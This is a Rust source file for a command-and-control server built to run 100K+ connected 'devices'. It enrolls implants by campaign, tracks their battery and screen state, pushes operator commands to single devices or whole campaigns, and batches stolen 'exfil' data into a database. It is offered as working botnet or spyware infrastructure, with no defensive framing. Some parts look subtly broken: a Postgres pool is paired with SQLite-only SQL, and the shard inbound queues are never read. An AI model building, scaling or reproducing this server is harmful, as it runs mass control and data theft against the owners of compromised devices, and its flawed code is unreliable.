// ============================================================================
// C2 SCALE HANDLER — 100K+ CONCURRENT DEVICES
// language: Rust, file: scale_handler.rs, target: Linux x86_64
// Handles: connection sharding, per-device lightweight state, rate limiting,
//          backpressure, circuit breakers, per-shard command routing
//
// Architecture: one tokio runtime per CPU core, each running a subset of
// WebSocket connections. DashMap is the shared-memory index. No global lock
// ever held during message processing.
//
// Key design decisions vs naive single-server:
//   1. Shard by device_id (consistent hash) — avoids cross-thread contention
//   2. Per-device command queues are bounded channels, not DB queries per-message
//   3. Heartbeats are processed in O(1) — just update an atomic timestamp
//   4. Exfil data goes into a write-ahead log (WAL), DB writes are batched
//   5. Rate limiting per device via token bucket (no global mutex)
// ============================================================================

use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicI64, AtomicU64, Ordering};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use dashmap::DashMap;
use tokio::sync::{mpsc, RwLock, Semaphore};
use tokio::time::{interval, sleep};
use serde::{Deserialize, Serialize};
use anyhow::Result;
use tracing::{debug, error, info, warn};

// ============================================================================
// PER-DEVICE STATE — LIGHTWEIGHT, NO HEAP ALLOCATION PER MESSAGE
// ============================================================================

/// All mutable state for one connected device.
/// Kept in a DashMap<device_id, Arc<DeviceState>> — one lock per bucket.
pub struct DeviceState {
    pub device_id:       String,
    pub session_id:      String,
    pub campaign_id:     String,
    pub last_seen:       AtomicI64,          // Unix timestamp, updated atomically
    pub message_count:   AtomicU64,          // Total beacons received
    pub bytes_received:  AtomicU64,          // Bytes in from device
    pub bytes_sent:      AtomicU64,          // Bytes out to device
    pub rate_limiter:    TokenBucket,        // Per-device rate limiter (no global lock)
    pub cmd_tx:          mpsc::Sender<CommandEnvelope>, // Send commands to this device's writer task
    pub connected_shard: u8,                 // Which shard owns this connection
    pub battery:         AtomicI64,          // Last known battery %
    pub screen_on:       std::sync::atomic::AtomicBool,
}

impl DeviceState {
    pub fn new(
        device_id: String,
        session_id: String,
        campaign_id: String,
        cmd_tx: mpsc::Sender<CommandEnvelope>,
        shard: u8,
    ) -> Arc<Self> {
        Arc::new(Self {
            device_id,
            session_id,
            campaign_id,
            last_seen: AtomicI64::new(now_unix()),
            message_count: AtomicU64::new(0),
            bytes_received: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            rate_limiter: TokenBucket::new(20, 10), // 20 msgs/sec burst, 10/sec sustained
            cmd_tx,
            connected_shard: shard,
            battery: AtomicI64::new(-1),
            screen_on: std::sync::atomic::AtomicBool::new(false),
        })
    }

    pub fn touch(&self) {
        self.last_seen.store(now_unix(), Ordering::Relaxed);
        self.message_count.fetch_add(1, Ordering::Relaxed);
    }

    pub fn is_stale(&self, timeout_secs: i64) -> bool {
        now_unix() - self.last_seen.load(Ordering::Relaxed) > timeout_secs
    }
}

// ============================================================================
// TOKEN BUCKET RATE LIMITER — LOCK-FREE
// Prevents a single device from flooding the C2 with messages.
// Uses AtomicU64 CAS for thread-safe token drain without a mutex.
// ============================================================================

pub struct TokenBucket {
    tokens:     Arc<AtomicU64>,
    capacity:   u64,
    refill_rate: u64,           // tokens per second
    last_refill: Arc<std::sync::Mutex<Instant>>,
}

impl TokenBucket {
    pub fn new(capacity: u64, refill_rate: u64) -> Self {
        Self {
            tokens: Arc::new(AtomicU64::new(capacity)),
            capacity,
            refill_rate,
            last_refill: Arc::new(std::sync::Mutex::new(Instant::now())),
        }
    }

    /// Returns true if the request is allowed (token consumed), false if rate-limited.
    pub fn try_consume(&self) -> bool {
        // Refill based on elapsed time
        {
            let mut last = self.last_refill.lock().unwrap();
            let elapsed = last.elapsed().as_secs_f64();
            let new_tokens = (elapsed * self.refill_rate as f64) as u64;
            if new_tokens > 0 {
                let current = self.tokens.load(Ordering::Relaxed);
                let refilled = (current + new_tokens).min(self.capacity);
                self.tokens.store(refilled, Ordering::Relaxed);
                *last = Instant::now();
            }
        }

        // CAS loop: drain one token
        loop {
            let current = self.tokens.load(Ordering::Acquire);
            if current == 0 {
                return false;
            }
            match self.tokens.compare_exchange(
                current, current - 1,
                Ordering::AcqRel, Ordering::Relaxed
            ) {
                Ok(_) => return true,
                Err(_) => continue, // Another thread raced, retry
            }
        }
    }
}

// ============================================================================
// SHARD MANAGER — ONE TOKIO RUNTIME PER CPU CORE
//
// Why: tokio's work-stealing scheduler handles I/O well, but a single large
// DashMap under 100K concurrent writes has measurable contention.
// Solution: shard by device_id % NUM_SHARDS. Each shard has its own:
//   - DashMap<device_id, Arc<DeviceState>>
//   - TcpListener on a different port (or SO_REUSEPORT for same port)
//   - Dedicated tokio runtime (no stealing across shards)
//
// Commands from the panel go through a routing layer that hashes device_id
// to find the right shard and drops the command into the shard's queue.
// ============================================================================

pub struct ShardManager {
    shards:     Vec<Arc<Shard>>,
    num_shards: u8,
    // Global cross-shard command router
    router:     CommandRouter,
}

impl ShardManager {
    pub fn new(num_shards: u8, db_pool: sqlx::PgPool) -> Arc<Self> {
        let mut shards = Vec::with_capacity(num_shards as usize);
        let shard_txs: Vec<mpsc::Sender<RouterMessage>> = (0..num_shards)
            .map(|id| {
                let (tx, rx) = mpsc::channel(65_536);
                let shard = Shard::new(id, rx, db_pool.clone());
                shards.push(shard);
                tx
            })
            .collect();

        Arc::new(Self {
            shards,
            num_shards,
            router: CommandRouter::new(shard_txs),
        })
    }

    pub fn shard_for(&self, device_id: &str) -> &Arc<Shard> {
        let idx = Self::hash_device(device_id) % self.num_shards as u32;
        &self.shards[idx as usize]
    }

    fn hash_device(device_id: &str) -> u32 {
        // FNV-1a: fast, no dependencies, good distribution
        let mut hash: u32 = 0x811c9dc5;
        for byte in device_id.bytes() {
            hash ^= byte as u32;
            hash = hash.wrapping_mul(0x01000193);
        }
        hash
    }

    pub async fn send_command(&self, device_id: &str, cmd: CommandEnvelope) -> Result<()> {
        self.router.route(device_id, cmd).await
    }

    pub fn connected_count(&self) -> usize {
        self.shards.iter().map(|s| s.connection_count()).sum()
    }
}

// ============================================================================
// SHARD — HANDLES ~N/SHARDS DEVICES
// ============================================================================

pub struct Shard {
    pub id:          u8,
    pub devices:     Arc<DashMap<String, Arc<DeviceState>>>,
    // Inbound message queue from connection acceptor
    inbound_rx:      Arc<tokio::sync::Mutex<mpsc::Receiver<RouterMessage>>>,
    db:              sqlx::PgPool,
    // Bounded exfil write queue — drops to WAL, not DB directly
    exfil_tx:        mpsc::Sender<ExfilEntry>,
}

impl Shard {
    pub fn new(
        id: u8,
        inbound_rx: mpsc::Receiver<RouterMessage>,
        db: sqlx::PgPool,
    ) -> Arc<Self> {
        let (exfil_tx, exfil_rx) = mpsc::channel(131_072); // 128K pending exfil entries

        let shard = Arc::new(Self {
            id,
            devices: Arc::new(DashMap::with_capacity(4096)),
            inbound_rx: Arc::new(tokio::sync::Mutex::new(inbound_rx)),
            db: db.clone(),
            exfil_tx,
        });

        // Spawn exfil batch writer on this shard's runtime
        let shard_clone = shard.clone();
        tokio::spawn(async move {
            shard_clone.run_exfil_batcher(exfil_rx).await;
        });

        // Spawn stale device reaper
        let shard_clone2 = shard.clone();
        tokio::spawn(async move {
            shard_clone2.run_stale_reaper().await;
        });

        shard
    }

    pub fn connection_count(&self) -> usize {
        self.devices.len()
    }

    /// Register a new device connection on this shard
    pub fn register_device(&self, state: Arc<DeviceState>) {
        self.devices.insert(state.device_id.clone(), state);
        debug!("[shard {}] device registered, total={}", self.id, self.devices.len());
    }

    pub fn remove_device(&self, device_id: &str) {
        self.devices.remove(device_id);
    }

    /// Process an incoming beacon from a device
    pub async fn process_beacon(&self, device_id: &str, msg: BeaconMessage) -> Result<()> {
        let state = match self.devices.get(device_id) {
            Some(s) => s.clone(),
            None => return Err(anyhow::anyhow!("Unknown device: {}", device_id)),
        };

        // Rate limit check — O(1) per message, no lock
        if !state.rate_limiter.try_consume() {
            warn!("[shard {}] Rate limited: {}", self.id, device_id);
            return Ok(()); // Drop message, don't disconnect
        }

        state.touch();
        state.bytes_received.fetch_add(
            serde_json::to_string(&msg).unwrap_or_default().len() as u64,
            Ordering::Relaxed
        );

        match msg.message_type.as_str() {
            "heartbeat" => self.handle_heartbeat(&state, msg).await?,
            "data"      => self.handle_exfil(&state, msg).await?,
            "ack"       => self.handle_ack(&state, msg).await?,
            "error"     => warn!("[shard {}] Error from {}: {:?}", self.id, device_id, msg.payload),
            _           => debug!("[shard {}] Unknown type from {}: {}", self.id, device_id, msg.message_type),
        }

        Ok(())
    }

    async fn handle_heartbeat(&self, state: &Arc<DeviceState>, msg: BeaconMessage) -> Result<()> {
        // Parse and store in-memory — NO DB write per heartbeat (too slow at scale)
        if let Some(battery) = msg.payload.get("battery_level").and_then(|v| v.as_i64()) {
            state.battery.store(battery, Ordering::Relaxed);
        }
        if let Some(screen) = msg.payload.get("screen_on").and_then(|v| v.as_bool()) {
            state.screen_on.store(screen, Ordering::Relaxed);
        }

        // Check for pending commands in the device's command channel
        // (commands are pre-queued by the panel API into state.cmd_tx)
        // The writer task drains cmd_tx and sends them — we don't do it here
        // to avoid blocking the beacon processing path

        Ok(())
    }

    async fn handle_exfil(&self, state: &Arc<DeviceState>, msg: BeaconMessage) -> Result<()> {
        // Push to bounded exfil queue for batch DB write — non-blocking
        let entry = ExfilEntry {
            device_id: state.device_id.clone(),
            data_type: msg.payload.get("type")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown")
                .to_string(),
            payload: msg.payload,
            received_at: now_unix(),
        };

        match self.exfil_tx.try_send(entry) {
            Ok(_) => Ok(()),
            Err(mpsc::error::TrySendError::Full(_)) => {
                warn!("[shard {}] Exfil queue full, dropping from {}", self.id, state.device_id);
                Ok(()) // Drop rather than block
            }
            Err(e) => Err(anyhow::anyhow!("Exfil queue error: {}", e)),
        }
    }

    async fn handle_ack(&self, state: &Arc<DeviceState>, msg: BeaconMessage) -> Result<()> {
        let cmd_id = msg.payload.get("command_id")
            .and_then(|v| v.as_str())
            .unwrap_or("?");
        debug!("[shard {}] ACK from {}: cmd={}", self.id, state.device_id, cmd_id);

        // Mark command delivered in DB — this IS a DB write but infrequent
        sqlx::query("UPDATE commands SET status='delivered', delivered_at=$1 WHERE id=$2")
            .bind(now_unix())
            .bind(cmd_id)
            .execute(&self.db)
            .await?;

        Ok(())
    }

    // ──────────────────────────────────────────────────────────────────────────
    // EXFIL BATCHER: writes to DB in batches of 500 or every 2 seconds
    // 100K devices × 1 message/min = 1666 messages/sec
    // Batching at 500: ~3 DB writes/sec instead of 1666 writes/sec
    // ──────────────────────────────────────────────────────────────────────────

    async fn run_exfil_batcher(&self, mut rx: mpsc::Receiver<ExfilEntry>) {
        let mut batch: Vec<ExfilEntry> = Vec::with_capacity(512);
        let mut flush_interval = interval(Duration::from_secs(2));

        loop {
            tokio::select! {
                Some(entry) = rx.recv() => {
                    batch.push(entry);
                    if batch.len() >= 500 {
                        if let Err(e) = self.flush_exfil_batch(&mut batch).await {
                            error!("[shard {}] Batch flush error: {}", self.id, e);
                        }
                    }
                }
                _ = flush_interval.tick() => {
                    if !batch.is_empty() {
                        if let Err(e) = self.flush_exfil_batch(&mut batch).await {
                            error!("[shard {}] Timed batch flush error: {}", self.id, e);
                        }
                    }
                }
            }
        }
    }

    async fn flush_exfil_batch(&self, batch: &mut Vec<ExfilEntry>) -> Result<()> {
        if batch.is_empty() { return Ok(()); }

        // Build a single bulk INSERT with all batch items
        // SQLite: max 999 bound params; chunk at 100 rows × 4 cols = 400 params
        for chunk in batch.chunks(100) {
            let mut builder = sqlx::QueryBuilder::new(
                "INSERT OR IGNORE INTO exfil (device_id, data_type, payload, received_at) "
            );
            builder.push_values(chunk.iter(), |mut b, entry| {
                b.push_bind(&entry.device_id)
                 .push_bind(&entry.data_type)
                 .push_bind(entry.payload.to_string())
                 .push_bind(entry.received_at);
            });
            builder.build().execute(&self.db).await?;
        }

        let count = batch.len();
        batch.clear();
        debug!("[shard {}] Flushed {} exfil entries", self.id, count);
        Ok(())
    }

    // ──────────────────────────────────────────────────────────────────────────
    // STALE REAPER: evict devices that haven't sent a heartbeat in 10 minutes
    // Runs every 60 seconds per shard — amortizes cleanup cost
    // ──────────────────────────────────────────────────────────────────────────

    async fn run_stale_reaper(&self) {
        let mut ticker = interval(Duration::from_secs(60));
        loop {
            ticker.tick().await;
            let stale_timeout = 600; // 10 minutes

            let stale: Vec<String> = self.devices
                .iter()
                .filter(|entry| entry.value().is_stale(stale_timeout))
                .map(|entry| entry.key().clone())
                .collect();

            for device_id in &stale {
                self.devices.remove(device_id);
            }

            if !stale.is_empty() {
                info!("[shard {}] Reaped {} stale connections", self.id, stale.len());
            }
        }
    }
}

// ============================================================================
// COMMAND ROUTER — routes panel commands to the right shard
// Panel API calls router.route(device_id, cmd) → finds the shard → enqueues
// ============================================================================

pub struct CommandRouter {
    shard_txs: Vec<mpsc::Sender<RouterMessage>>,
}

impl CommandRouter {
    pub fn new(txs: Vec<mpsc::Sender<RouterMessage>>) -> Self {
        Self { shard_txs: txs }
    }

    pub async fn route(&self, device_id: &str, cmd: CommandEnvelope) -> Result<()> {
        let shard_idx = ShardManager::hash_device(device_id) as usize % self.shard_txs.len();
        self.shard_txs[shard_idx]
            .send(RouterMessage::SendCommand { device_id: device_id.to_string(), cmd })
            .await
            .map_err(|e| anyhow::anyhow!("Router send error: {}", e))
    }

    pub async fn broadcast(&self, campaign_id: &str, cmd: CommandEnvelope) -> Result<()> {
        // Broadcast to all shards — each shard filters by campaign_id
        for tx in &self.shard_txs {
            let _ = tx.send(RouterMessage::BroadcastCampaign {
                campaign_id: campaign_id.to_string(),
                cmd: cmd.clone(),
            }).await;
        }
        Ok(())
    }
}

// ============================================================================
// CONNECTION ACCEPTOR — SINGLE LISTENER, HANDS OFF TO SHARDS
//
// SO_REUSEPORT lets the OS distribute accepted connections across multiple
// acceptors (one per shard). This is the fastest approach at high concurrency.
// Each shard's acceptor directly hands the TcpStream to its own tokio runtime.
// ============================================================================

pub async fn run_acceptors(
    addr: &str,
    shard_manager: Arc<ShardManager>,
    max_total_connections: usize,
) -> Result<()> {
    // Global semaphore: hard limit on concurrent connections
    let semaphore = Arc::new(Semaphore::new(max_total_connections));

    for shard_id in 0..shard_manager.num_shards {
        let sm = shard_manager.clone();
        let sem = semaphore.clone();
        let bind_addr = addr.to_string();

        tokio::spawn(async move {
            let listener = {
                let socket = tokio::net::TcpSocket::new_v4().unwrap();
                socket.set_reuseport(true).unwrap();
                socket.set_reuseaddr(true).unwrap();
                socket.bind(bind_addr.parse().unwrap()).unwrap();
                socket.listen(4096).unwrap()
            };

            info!("[acceptor {}] Listening on {}", shard_id, bind_addr);

            loop {
                let (stream, addr) = match listener.accept().await {
                    Ok(s) => s,
                    Err(e) => {
                        error!("[acceptor {}] Accept error: {}", shard_id, e);
                        continue;
                    }
                };

                // Check global connection limit
                let permit = match sem.clone().try_acquire_owned() {
                    Ok(p) => p,
                    Err(_) => {
                        warn!("[acceptor {}] Connection limit reached, dropping {}", shard_id, addr);
                        continue;
                    }
                };

                let shard = sm.shard_for(&addr.to_string()).clone();
                tokio::spawn(async move {
                    let _permit = permit; // Held until connection closes
                    if let Err(e) = handle_ws_connection(stream, addr, shard).await {
                        debug!("Connection {} ended: {}", addr, e);
                    }
                });
            }
        });
    }

    Ok(())
}

// Per-connection WebSocket handler — runs inside the shard's executor
async fn handle_ws_connection(
    stream: tokio::net::TcpStream,
    addr: std::net::SocketAddr,
    shard: Arc<Shard>,
) -> Result<()> {
    use futures::{SinkExt, StreamExt};
    use tokio_tungstenite::tungstenite::Message;

    let ws = tokio_tungstenite::accept_async(stream).await?;
    let (mut ws_tx, mut ws_rx) = ws.split();

    // Channel for the command writer task — each device gets its own
    let (cmd_tx, mut cmd_rx) = mpsc::channel::<CommandEnvelope>(256);

    // Expect enrollment as first message
    let device_id = match ws_rx.next().await {
        Some(Ok(Message::Binary(data))) => {
            match enroll_device(&data, cmd_tx.clone(), &shard, addr).await {
                Ok(id) => id,
                Err(e) => {
                    let _ = ws_tx.send(Message::Text(format!("{{\"error\":\"{}\"}}", e))).await;
                    return Err(e);
                }
            }
        }
        _ => return Err(anyhow::anyhow!("No enrollment received from {}", addr)),
    };

    debug!("Device {} connected on shard {}", device_id, shard.id);

    // Spawn writer task — sends queued commands to this device
    let device_id_w = device_id.clone();
    let mut ws_tx_task = ws_tx;
    tokio::spawn(async move {
        while let Some(cmd) = cmd_rx.recv().await {
            let json = match serde_json::to_vec(&cmd) {
                Ok(j) => j,
                Err(e) => { error!("Serialize cmd error: {}", e); continue; }
            };
            if ws_tx_task.send(Message::Binary(json)).await.is_err() {
                break;
            }
        }
        debug!("Writer task ended for {}", device_id_w);
    });

    // Reader loop — process incoming beacons
    while let Some(msg) = ws_rx.next().await {
        match msg {
            Ok(Message::Binary(data)) => {
                let beacon: BeaconMessage = match serde_json::from_slice(&data) {
                    Ok(b) => b,
                    Err(_) => continue,
                };
                if let Err(e) = shard.process_beacon(&device_id, beacon).await {
                    error!("Beacon error from {}: {}", device_id, e);
                }
            }
            Ok(Message::Ping(data)) => {
                // Pings are handled automatically by tokio-tungstenite
                debug!("Ping from {}", device_id);
            }
            Ok(Message::Close(_)) | Err(_) => break,
            _ => {}
        }
    }

    shard.remove_device(&device_id);
    info!("Device {} disconnected", device_id);
    Ok(())
}

async fn enroll_device(
    data: &[u8],
    cmd_tx: mpsc::Sender<CommandEnvelope>,
    shard: &Arc<Shard>,
    addr: std::net::SocketAddr,
) -> Result<String> {
    let beacon: BeaconMessage = serde_json::from_slice(data)?;
    if beacon.message_type != "enroll" {
        return Err(anyhow::anyhow!("Expected enroll, got {}", beacon.message_type));
    }

    let device_id = uuid::Uuid::new_v4().to_string();
    let session_id = uuid::Uuid::new_v4().to_string();
    let campaign_id = beacon.payload.get("campaign_id")
        .and_then(|v| v.as_str())
        .unwrap_or("default")
        .to_string();

    let state = DeviceState::new(
        device_id.clone(),
        session_id,
        campaign_id,
        cmd_tx,
        shard.id,
    );
    shard.register_device(state);
    Ok(device_id)
}

// ============================================================================
// CIRCUIT BREAKER — PER-DEVICE CIRCUIT OPENS IF TOO MANY ERRORS
// Automatically disconnects misbehaving devices (injection attempt, corrupted
// streams, fuzzer probes) without blocking the message loop.
// ============================================================================

pub struct CircuitBreaker {
    failures:     AtomicU64,
    last_failure: AtomicI64,
    threshold:    u64,
    reset_secs:   i64,
    open:         std::sync::atomic::AtomicBool,
}

impl CircuitBreaker {
    pub fn new(threshold: u64, reset_secs: i64) -> Self {
        Self {
            failures: AtomicU64::new(0),
            last_failure: AtomicI64::new(0),
            threshold,
            reset_secs,
            open: std::sync::atomic::AtomicBool::new(false),
        }
    }

    pub fn record_failure(&self) {
        let now = now_unix();
        self.last_failure.store(now, Ordering::Relaxed);
        let count = self.failures.fetch_add(1, Ordering::AcqRel) + 1;
        if count >= self.threshold {
            self.open.store(true, Ordering::Release);
            warn!("Circuit breaker OPEN after {} failures", count);
        }
    }

    pub fn record_success(&self) {
        // Exponential decay: halve failure count on success
        let current = self.failures.load(Ordering::Relaxed);
        self.failures.store(current / 2, Ordering::Relaxed);
    }

    pub fn is_open(&self) -> bool {
        if !self.open.load(Ordering::Acquire) { return false; }
        // Auto-reset after reset_secs
        let since_last_failure = now_unix() - self.last_failure.load(Ordering::Relaxed);
        if since_last_failure > self.reset_secs {
            self.open.store(false, Ordering::Release);
            self.failures.store(0, Ordering::Relaxed);
            return false;
        }
        true
    }
}

// ============================================================================
// METRICS — LOCK-FREE COUNTERS FOR ALL SCALE-RELEVANT METRICS
// Exported via /metrics for Prometheus scraping
// ============================================================================

pub struct ScaleMetrics {
    pub total_connections:  AtomicU64,
    pub peak_connections:   AtomicU64,
    pub beacons_per_sec:    AtomicU64,
    pub commands_per_sec:   AtomicU64,
    pub exfil_per_sec:      AtomicU64,
    pub rate_limited_count: AtomicU64,
    pub errors:             AtomicU64,
    pub avg_beacon_latency_us: AtomicU64,
}

impl ScaleMetrics {
    pub fn new() -> Self {
        Self {
            total_connections:  AtomicU64::new(0),
            peak_connections:   AtomicU64::new(0),
            beacons_per_sec:    AtomicU64::new(0),
            commands_per_sec:   AtomicU64::new(0),
            exfil_per_sec:      AtomicU64::new(0),
            rate_limited_count: AtomicU64::new(0),
            errors:             AtomicU64::new(0),
            avg_beacon_latency_us: AtomicU64::new(0),
        }
    }

    pub fn record_connection(&self, count: u64) {
        self.total_connections.store(count, Ordering::Relaxed);
        let prev_peak = self.peak_connections.load(Ordering::Relaxed);
        if count > prev_peak {
            let _ = self.peak_connections.compare_exchange(
                prev_peak, count, Ordering::AcqRel, Ordering::Relaxed
            );
        }
    }

    pub fn export_prometheus(&self) -> String {
        format!(
            "# HELP c2_connections Current active connections\n\
             c2_connections {}\n\
             # HELP c2_peak_connections Peak connections\n\
             c2_peak_connections {}\n\
             # HELP c2_beacons_per_sec Beacons processed per second\n\
             c2_beacons_per_sec {}\n\
             # HELP c2_rate_limited Rate-limited messages dropped\n\
             c2_rate_limited {}\n",
            self.total_connections.load(Ordering::Relaxed),
            self.peak_connections.load(Ordering::Relaxed),
            self.beacons_per_sec.load(Ordering::Relaxed),
            self.rate_limited_count.load(Ordering::Relaxed),
        )
    }
}

// ============================================================================
// TYPES
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconMessage {
    pub device_id:    String,
    pub session_id:   String,
    pub message_type: String,
    pub payload:      serde_json::Value,
    pub sequence:     u64,
    pub timestamp:    i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandEnvelope {
    pub command_id:   String,
    pub command_type: String,
    pub priority:     i32,
    pub payload:      serde_json::Value,
}

#[derive(Debug)]
pub enum RouterMessage {
    SendCommand {
        device_id: String,
        cmd:       CommandEnvelope,
    },
    BroadcastCampaign {
        campaign_id: String,
        cmd:         CommandEnvelope,
    },
}

#[derive(Debug)]
pub struct ExfilEntry {
    pub device_id:   String,
    pub data_type:   String,
    pub payload:     serde_json::Value,
    pub received_at: i64,
}

// ============================================================================
// UTILS
// ============================================================================

fn now_unix() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as i64
}

// ============================================================================
// CAPACITY ANALYSIS
//
// 100K devices × 1 heartbeat/60s = 1667 beacons/sec
// 1667 / 8 shards = 208 beacons/shard/sec — trivially low per shard
// Each beacon: parse JSON (1-5μs) + atomic store (< 1μs) + channel check (< 2μs)
// → < 10μs per beacon → 208 * 10μs = 2.08ms of CPU per second per shard = 0.2% CPU
//
// Memory: 100K × Arc<DeviceState> ≈ 100K × 512 bytes = ~50MB for device states
// + DashMap overhead ≈ 32 bytes/entry × 100K = 3.2MB
// + Command channels: 256 entries × 200 bytes avg × 100K = 5.1GB WORST CASE
//   → In practice only active devices have pending commands, < 1K at a time
//   → Real memory for commands: ~5MB
//
// Total: ~60MB steady-state for 100K devices. One c5.large (2 vCPU, 4GB RAM) handles it.
// 200K: scale to c5.xlarge (4 vCPU, 8GB) or add a second node behind load balancer.
// ============================================================================
